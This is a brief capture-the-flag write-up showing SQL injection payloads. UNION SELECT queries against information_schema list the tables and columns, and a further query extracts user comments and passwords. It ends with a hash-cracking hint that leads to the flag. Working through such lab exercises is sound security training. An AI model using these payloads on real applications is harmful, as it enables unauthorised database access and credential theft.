Finding out all tables in the db '0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES'

Finding out all the columns in the db '0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS'

Lets look at users comments and their countersign '1 or 1=1 UNION SELECT Commentaire, countersign FROM users'

We can see the tip "Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 5ff9d0165b4f92b14994e5c685cdce28"

After that we have the flag.